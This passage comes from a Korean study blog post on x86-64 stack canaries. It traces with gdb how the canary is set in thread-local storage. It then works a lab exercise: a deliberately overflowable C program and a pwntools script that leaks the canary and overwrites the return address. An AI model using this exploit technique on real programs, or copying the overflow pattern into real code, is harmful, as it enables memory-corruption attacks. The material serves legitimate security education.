     _head-&gt;tcb = _thrdescr;                                                      \
     </span><span class="cm">/* For now the thread descriptor is at the same address.  */</span><span class="cp">              \
     _head-&gt;self = _thrdescr;                                                      \
                                                                              \
     </span><span class="cm">/* It is a simple syscall to set the %fs value for the thread.  */</span><span class="cp">              \
     asm volatile ("syscall"                                                      \
                   : "=a" (_result)                                              \
                   : "0" ((unsigned long int) __NR_arch_prctl),                      \
                     "D" ((unsigned long int) ARCH_SET_FS),                      \
                     "S" (_thrdescr)                                              \
                   : "memory", "cc", "r11", "cx");                              \
                                                                              \
    _result ? "cannot set %fs base address for thread-local storage" : 0;     \
  })
</span></code></pre></div></div> <p><br /></p> <p>중간에서 <code class="language-plaintext highlighter-rouge">asm volatile</code> 로 인라인 어셈이 명시된 것이 보인다. <code class="language-plaintext highlighter-rouge">asm volatile</code>은 <code class="language-plaintext highlighter-rouge">__asm__ __volatile__(asms:output:input:clobber);</code> 형식으로 사용되며, x86과 x86-64 환경에서는 <code class="language-plaintext highlighter-rouge">“D”</code> 심볼이 <code class="language-plaintext highlighter-rouge">‘di’</code> 레지스터를 의미한다. 자세한 내용은 <a href="https://wiki.kldp.org/KoreanDoc/html/EmbeddedKernel-KLDP/app3.basic.html">여기에서</a></p> <p>즉, <code class="language-plaintext highlighter-rouge">TLS_INIT_TP</code> 가 실행되면 <code class="language-plaintext highlighter-rouge">ARCH_SET_FS</code> 가 <code class="language-plaintext highlighter-rouge">rdi</code> 에 들어가 있을 것이다. 그렇다면 <code class="language-plaintext highlighter-rouge">ARCH_SET_FS</code> 는 어떤 값을 가지고 있을까?</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//prctl.h</span>
<span class="cp">#ifndef _ASM_X86_PRCTL_H
#define _ASM_X86_PRCTL_H
</span>
<span class="cp">#define ARCH_SET_GS 0x1001
#define ARCH_SET_FS 0x1002
#define ARCH_GET_FS 0x1003
#define ARCH_GET_GS 0x1004
</span>
<span class="cp">#endif </span><span class="cm">/* _ASM_X86_PRCTL_H */</span><span class="cp">
</span></code></pre></div></div> <p><br /></p> <p>위의 <code class="language-plaintext highlighter-rouge">TLS_INIT_TP</code> 가 명시된 소스 코드에 include된 <code class="language-plaintext highlighter-rouge">sys/prctl.h</code> 의 소스를 보니, <code class="language-plaintext highlighter-rouge">0x1002</code>인 것으로 확인되었다.</p> <p>즉, <code class="language-plaintext highlighter-rouge">TLS_INIT_TP</code> 가 실행되면 <code class="language-plaintext highlighter-rouge">rdi</code> 에 <code class="language-plaintext highlighter-rouge">0x1002</code> 가 저장되고, 목표했던 <code class="language-plaintext highlighter-rouge">syscall</code>(__NR_arch_prctl; 여기에서 NR은 달라지는 아키텍처에 따라 시스콜이 추가되면서 호환성을 위해 각 아키텍처별로 다르게 호명할 수 있도록 호환성을 보장하기 위한 태그다. 자세한 건 <a href="https://man7.org/linux/man-pages/man2/syscall.2.html">여기</a>에서)이 수행되며 FS에 TLS 구조체의 시작값이 할당될 것이다.</p> <p>정말로 그런지 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2012.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">TLS_INIT_TP</code> 가 콜되기 직전에 <code class="language-plaintext highlighter-rouge">rdi</code> 에 <code class="language-plaintext highlighter-rouge">0x1002</code> 가 들어간 게 보인다. 콜되기 전에 미리 파라미터가 레지스터에 들어간 것으로 미루어 보았을 때 아마도 컴파일러의 최적화 때문에 순서가 당겨진 것 같다.</p> <p>그리고 같은 이유로 인해 이미 시스콜이 수행되며 <code class="language-plaintext highlighter-rouge">r12</code>에 <code class="language-plaintext highlighter-rouge">TLS</code> 의 시작값이 들어간 것이 확인되었다<sup id="fnref:r12" role="doc-noteref"><a href="#fn:r12" class="footnote" rel="footnote">4</a></sup>. 실제로 <code class="language-plaintext highlighter-rouge">fs</code> 에 할당된 값이 맞는지 명령어를 통해 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2013.jpeg" alt="Untitled" /></p> <p>맞는 것으로 확인되었다.</p> <p>앞에 $가 붙은 것은 gdb상에서 심볼로 취급되므로 명령어 인라인에 사용할 수 있다. <code class="language-plaintext highlighter-rouge">fs_base</code> 가 가리키는 <code class="language-plaintext highlighter-rouge">TLS</code> 에 무엇이 저장되었는지 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2014.jpeg" alt="Untitled" /></p> <p>그렇다면 <code class="language-plaintext highlighter-rouge">fs_base+0x28</code>, 즉 스택 카나리가 저장되는 위치에 스택 카나리가 저장되어 있는지 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2015.jpeg" alt="Untitled" /></p> <p>아직은 아무것도 저장되어 있지 않은 것을 확인할 수 있다.</p> <p><br /></p> <h2 id="22-스택-카나리의-저장-과정-추적">2.2. 스택 카나리의 저장 과정 추적</h2> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">fs_base+0x28</code> 위치의 값이 변경될 때가 바로 스택 카나리가 저장될 때일 것이다. 따라서 gdb의 <code class="language-plaintext highlighter-rouge">watch</code> 명령어로 해당 위치의 값이 변경될 때 코드 플로우를 멈추도록 해 보았다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2016.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">*</code> 심볼은 참조한다는 뜻이다. 즉, 해당 주소를 참조해 내부의 값을 감시한다는 뜻이 되기 때문에 특정 주소의 값 변화를 감시하기 위해서는 반드시 <code class="language-plaintext highlighter-rouge">*</code> 심볼을 사용해야 한다.</p> <p>프로세스를 <code class="language-plaintext highlighter-rouge">c</code> 명령어로 이어서 수행한 결과, 아래와 같은 결과가 나왔다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2017.jpeg" alt="Untitled" /></p> <p>값이 변화되자 코드 플로우가 멈추고 값이 어떻게 변화했는지가 출력된다. 정지하는 시점에서 실행되던 함수는 <code class="language-plaintext highlighter-rouge">security_init</code> 라고 명시되어 있다. 이제 실제로 <code class="language-plaintext highlighter-rouge">fs_base+0x28</code> 위치의 값이 어떻게 되었는지 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2018.jpeg" alt="Untitled" /></p> <p><img src="/assets/img/posts/sys6/Untitled%2019.jpeg" alt="Untitled" /></p> <p>스택 카나리 값이 저장된 것이 확인되었다.</p> <p><br /></p> <h2 id="23-main에서-사용되는-스택-카나리-확인">2.3. main에서 사용되는 스택 카나리 확인</h2> <p><br /></p> <p>이제 실제로 해당 값이 main 함수에서 사용되는지 확인해 보자.</p> <p><img src="/assets/img/posts/sys6/Untitled%2020.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">mov rax, qword prt fs:[0x28]</code> 명령어가 실행된 직후의 <code class="language-plaintext highlighter-rouge">rax</code> 를 확인해 보니, 정말로 직전에 확인했던 스택 카나리 값이 저장된 것을 볼 수 있었다.</p> <p><br /></p> <p><br /></p> <h1 id="3-카나리-우회">3. 카나리 우회</h1> <p><br /></p> <p>카나리를 포함한 각종 메모리 보호 기법 우회 관련해서는 이미 <a href="https://toubva.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/#/">이전 포스트</a>에서 다룬 바가 있지만, 한 번 더 정리하려 한다.</p> <p><br /></p> <h2 id="31-brute-force">3.1. Brute Force</h2> <p><br /></p> <p>해당 기법을 이용해 카나리를 맞춘다는 것은 불가능에 가깝다.</p> <p>카나리 값으로 <code class="language-plaintext highlighter-rouge">x64</code>에서는 8byte, <code class="language-plaintext highlighter-rouge">x86</code>에서는 4byte 길이의 pseudo-random 값이 생성되며, 가장 끝 1byte가 <code class="language-plaintext highlighter-rouge">/x00</code> 인 것을 감안하더라도 각각 7byte, 4byte의 자릿수를 맞춰야 하기 때문이다.</p> <p>실제 서버를 대상으로 이 기법을 수행하면 성공하기 한참 전에 경찰에 체포될 것이다.</p> <p><br /></p> <h2 id="32-tls-접근-canary-leak">3.2. TLS 접근-Canary Leak</h2> <p><br /></p> <p>TLS의 주소는 매번 시행할 때마다 바뀌지만, 만일 실행중에 TLS의 주소를 알 수 있고 이에 쓰기나 읽기가 가능하다면 읽어온 카나리 값을 이용하거나, 카나리 값 자체를 변조할 수 있을 것이다.</p> <p><br /></p> <p><br /></p> <h1 id="4-카나리-우회-실습">4. 카나리 우회 실습</h1> <p><br /></p> <h2 id="41-코드-분석">4.1. 코드 분석</h2> <p><br /></p> <p>아래 코드를 컴파일한 프로그램에서 Stack Smashed 감지 없이 오버플로우를 수행해 보자.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Name: bypass_canary.c</span>
<span class="c1">// Compile: gcc -o bypass_canary bypass_canary.c</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">memo</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"name : "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"hello %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"memo : "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">memo</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"memo %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">memo</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><br /></p> <p>가장 먼저 이름을 입력하는 란에 8글자를 입력해 보았다.</p> <p><code class="language-plaintext highlighter-rouge">read</code> 함수가 64글자까지를 받기 때문에, 원래는 7글자까지만 사용자 입력을 받은 다음 뒤에 NULL byte가 붙을 것을 상정하고 선언된 <code class="language-plaintext highlighter-rouge">name</code> 배열은 충분히 오버플로우될 수 있다.</p> <p>즉, 스택 카나리의 최하위 1byte가 <code class="language-plaintext highlighter-rouge">\x00</code>, 즉 NULL byte로 설정되는 특성과 리틀 엔디안으로 가장 작은 자릿수가 가장 먼저 인식된다는 점을 감안했을 때, Canary Leak을 원하는 사용자는 총 9byte의 입력을 주어 스택 카나리의 최하위에 존재하는 NULL byte를 없애야만 한다.</p> <p>이를 그림으로 본다면 아래와 같다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2021.jpeg" alt="Untitled" /></p> <p>위와 같았던 메모리를</p> <p><img src="/assets/img/posts/sys6/Untitled%2022.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">name</code> 변수에 9byte를 넣음으로써 스택 카나리의 최하위 비트인 <code class="language-plaintext highlighter-rouge">\x00</code> 이 지워지게 만들었다.</p> <p>이후 name 변수를 출력하기 위해 <code class="language-plaintext highlighter-rouge">printf</code> 함수를 사용하는데, 해당 함수는 null byte를 문자열의 끝으로 보고 메모리 읽기를 멈추는 특성이 있기 때문에 스택 카나리까지를 고스란히 출력하게 된다.</p> <p><br /></p> <h2 id="42-익스플로잇-구성">4.2. 익스플로잇 구성</h2> <p><br /></p> <p>이제 익스플로잇을 짜 보자.</p> <p>익스플로잇에 구현되어야 할 기능은 다음과 같다.</p> <ol> <li>총 9 byte의 입력값을 준다. <code class="language-plaintext highlighter-rouge">sendline()</code> 함수를 사용한다면 끝에 개행 문자가 자동으로 붙는 것을 감안하여 해당 함수의 인자로 8 byte를 주는 식이다.</li> <li>이후 출력되는 값을 받아오고, 그중 하위 7byte만 저장한다. (문자열 출력 방식에 따라 리틀 엔디안 방식으로 표현된 스택 카나리가 나올 것이다)</li> <li>저장한 값의 최상위 1byte에 <code class="language-plaintext highlighter-rouge">\x00</code> 을 저장한다.</li> <li>이후 memo 변수에 대한 입력으로 <code class="language-plaintext highlighter-rouge">\x10</code> byte의 dump와 스택 카나리 값(리틀 엔디안), 8 byte의 dump, 그리고 RET로 주고 싶은 값을 준다. <ul> <li>ASLR이 켜져 있고 NX-bit가 활성화되어 있으며 Full-RELRO이기 때문에 이 경우 가능한 익스 방법은 GOT의 base 주소를 leak해서 system 함수의 PLT를 알아낸 다음 RET에 넣어주는 것이다. PLT의 주소를 덮어쓰는 게 불가능하니까…</li> <li>근데 그걸… 지금은 못할 듯? 일단 입력값을 최장 64 byte 만 받고 있기 때문에 현재 libc의 base가 leak되지 않았고 system 함수가 사용되지 않아 plt 심볼을 찾을 수 없는 점을 감안하면 더 돌아 돌아 가야 할 텐데, 그걸 64 byte 이내로 구현 못 하겠다.</li> <li>어떻게 할 지 방법이 안 서는 것도 있고!</li> </ul> </li> </ol> <p>따라서 익스플로잇의 목적은 리턴 주소를 원하는 값으로 변조하더라도 스택 카나리 변조가 인식되지 않게끔 하는 것으로 결정되었다.</p> <p><br /></p> <h2 id="43-익스플로잇-실행">4.3. 익스플로잇 실행</h2> <p><br /></p> <p>내가 작성한 익스플로잇은 아래와 같았다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./bypass_canary"</span><span class="p">)</span>

<span class="c1"># 1. 9 byte input
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'AAAAAAAA'</span><span class="p">)</span>

<span class="c1"># 2. get 7 bytes(least significant) from output and insert Null byte in front of it
</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'hello AAAAAAAA</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">temp</span><span class="o">=</span><span class="nb">bytearray</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">temp</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">zero</span><span class="o">=</span><span class="nb">bytearray</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">zero</span><span class="o">+</span><span class="n">temp</span>

<span class="c1"># 3. give the payload which I want
</span><span class="n">dump</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x10</span>
<span class="n">canary</span>
<span class="n">rbp_dump</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x08</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFCAFECAFE</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">dump</span><span class="o">+</span><span class="n">canary</span><span class="o">+</span><span class="n">rbp_dump</span><span class="o">+</span><span class="n">ret_addr</span>

<span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="nb">raw_input</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div> <p><br /></p> <p>해당 익스플로잇을 실행한 결과는 아래와 같았다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2023.jpeg" alt="Untitled" /></p> <p><code class="language-plaintext highlighter-rouge">main</code> 함수의 가장 마지막 부분에서 스택 카나리 원본과 스택에 저장된 스택 카나리 값을 비교하고 <code class="language-plaintext highlighter-rouge">main+183</code> 에서 만일 값이 같다면 정상적으로 프로세스를 종료하고 만일 아니라면 오류를 내보내도록 되어 있다. 따라서 <code class="language-plaintext highlighter-rouge">main+183</code> 에 브레이크 포인트를 걸고 continue해 보았다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2024.jpeg" alt="Untitled" /></p> <p>그 결과, rbp의 바로 아래인 ret addr에 내가 의도했던 리턴값이 들어가 있고, <code class="language-plaintext highlighter-rouge">rbp-0x8</code> 에는 스택 카나리 값이 그대로 들어가 있어 분기 조건에 부합하여 정상적으로 프로그램이 종료되는 루틴을 확인할 수 있었다.</p> <p><br /></p> <p><br /></p> <h1 id="번외-삽질이-남긴-지식">번외: 삽질이 남긴 지식</h1> <p><br /></p> <h2 id="1-와-리눅스-대상-분석을-하는데-윈도우-프로세스-관리를-가져왔다">1. 와! 리눅스 대상 분석을 하는데 윈도우 프로세스 관리를 가져왔다?!?</h2> <p><br /></p> <p>와! 샌즈! 아시는구나!</p> <p>이걸 쓰는 지금 눈물이 난다….</p> <p>아무 생각 없이 PCB에 대해 검색해서 구조체에 대해 열심히 공부하고 정리했는데… 윈도우 거였네</p> <p>아무튼 아래 내용은 윈도우의 프로세스 관리 구조체에 대해 서술한 내용이다.</p> <p>(나뭇잎 책에도 잘 나와 있는 내용이니 해당 책이 있는 사람들은 그걸 보길 추천한다. 나는 이걸 다 쓰고 나서 나뭇잎 책에 비슷한 내용이 있다는 사실을 깨달았다)</p> <p><br /></p> <p>어떤 프로세스가 실행될 경우, OS는 Time Sharing과 Space Sharing을 모두 적용한 상위 개념인 <strong>프로세스 스케줄링(Process Scheduling)</strong>을 수행하게 된다. 이는 Multiprogramming을 제공하는 OS가 가진 하드웨어 리소스의 제한 때문에 개발이 시작된 방법이면서, 이후 OS 내부에서 동일 자원에 접근하는 프로세스들이 동시에 실행될 경우 발생할 수 있는 Race Condition(Critical Section의 침해), 혹은 Deadlock(Critical Section을 여러 프로세스가 동시에 요구할 때 발생하는 교착상태)을 막기 위해 더욱 발전한 방법이다.</p> <p>이때, Time Sharing의 특성으로 인해 특정 <strong>프로그램 A를 일정 시간(Burst Time) 동안 수행하다가 중단하고, CPU를 다른 프로그램 B에게 할당해야 하는 상황</strong>이 생긴다. 이럴 경우:</p> <p>프로그램 A가 실행되던 상태를 저장하고 → 프로그램 B를 실행한 다음 → 다시 프로그램 A가 자원을 점유(Occupy)할 때 → 이전에 저장된 상태를 불러오는</p> <p>일련의 기능이 보장되어야 한다. 이를 위해 만들어진 것을 <strong>PCB</strong>라고 한다. Process Control Block의 준말이다.</p> <p>그리고 이 PCB의 확장판 개념을 <strong>윈도우 OS에서 구현한 것이 바로 EPROCESS 구조체</strong>다. 이 EPROCESS 구조체의 가장 첫 번째를 차지하는 것이 바로 KPROCESS(PCB) Block이고, <strong>세번째에 PEB 구조체</strong>를 가지고 있다. <strong>PEB 안에는 이미지 정보, 프로세스 힙 정보와 같은 유저 모드에서 접근할 수 있는 정보가 저장된다.</strong></p> <p><strong>PCB를 가지고 있는 EPROCESS</strong>와 <strong>PCB인 KPROCESS</strong>는 모두 <strong>커널 영역</strong>에 위치해 있어서, 유저 모드의 프로세스가 접근할 수 없기 때문에 <strong>유저 모드인 프로세스도 접근할 수 있도록 PEB를 따로 만들었다</strong>고 이해하면 된다.</p> <p>ETHREAD구조체와 KTHREAD구조체, 그리고 TEB의 관계도 동일하다.</p> <p>이 관계를 그림으로 그리면 아래와 같다.</p> <p><img src="/assets/img/posts/sys6/Untitled%2025.jpeg" alt="Untitled" /></p> <p>EPROCESS는 ETHREAD를 refer하지만, PEB와 TEB의 연결 관계는 없다.</p> <h2><br /></h2> <div class="footnotes" role="doc-endnotes"> <ol> <li id="fn:je" role="doc-endnote"> <p>보통 <code class="language-plaintext highlighter-rouge">je</code> 명령어는 ZF가 1로 세팅될 시 점프를 수행한다는 특성으로 인해(<code class="language-plaintext highlighter-rouge">jz</code> 와 동일한 동작을 한다) <code class="language-plaintext highlighter-rouge">cmp</code> 명령어와 함께 쓰인다. <code class="language-plaintext highlighter-rouge">cmp a, b</code> 일 때 a-b 연산을 수행하여 0일 때 ZF를 1로 세팅하는 로직이 있기 때문이다. <a href="#fnref:je" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> <li id="fn:TCBTLS" role="doc-endnote"> <p>TCB와 TLS를 동치해 사용하는 경우가 많지만 이 둘은 엄연히 구분되는 개념이다. TLS는 프로그래밍 방식의 일환으로서 쓰레드에게 로컬로 사용되는 각종 데이터를 따로 저장해 둔다는 아이디어의 구현이고, TCB는 메모리에 실제로 할당되는 블록으로서 쓰레드 자체의 정보를 저장하는 곳이다. 또한 이 <a href="https://uclibc.org/docs/tls.pdf">문서</a>에 따르면, TCB는 TLS 내부에 존재한다. <a href="#fnref:TCBTLS" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> <li id="fn:MSR" role="doc-endnote"> <p>x86 커널에서는 FS와 GS가 GDT(Global Descriptor Table)에 의해 관리된다. <a href="#fnref:MSR" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> <li id="fn:r12" role="doc-endnote"> <p>There are sixteen 64-bit registers in x86-64: %rax, %rbx, %rcx, %rdx, %rdi, %rsi, %rbp, %rsp, and %r8-r15. Of these, %rax, %rcx, %rdx, %rdi, %rsi, %rsp, and %r8-r11 are considered caller-save registers, meaning that they are not necessarily saved across function calls. Registers %rbx, %rbp, and %r12-r15 are callee-save registers, meaning that they are saved across function calls. <a href="#fnref:r12" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> </ol> </div> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="http://localhost:4000/blog/dreamhack_system_hacking/step6-1" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="http://localhost:4000/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div id="disqus_thread", style="width: 95%; margin-left: 3%;"><script> var disqus_config = function () { this.page.url = "http://localhost:4000/blog/dreamhack_system_hacking/step6-1"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/dreamhack_system_hacking/system-hacking-step6-1"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> <div id="#paper_study"></div> <li class="tag-head"> <a href="/blog/categories/paper_study">paper_study</a> </li> <a name="paper_study"></a> <div id="#network_hacking"></div> <li class="tag-head"> <a href="/blog/categories/network_hacking">network_hacking</a> </li> <a name="network_hacking"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="http://localhost:4000/">Home</a> </li> <li> <a href="http://localhost:4000/about">About</a> </li> <li> <a href="http://localhost:4000/blog">Blog</a> </li> <li> <a href="http://localhost:4000/contact">Contact</a> </li> </div> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="http://localhost:4000/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> </body> </html>
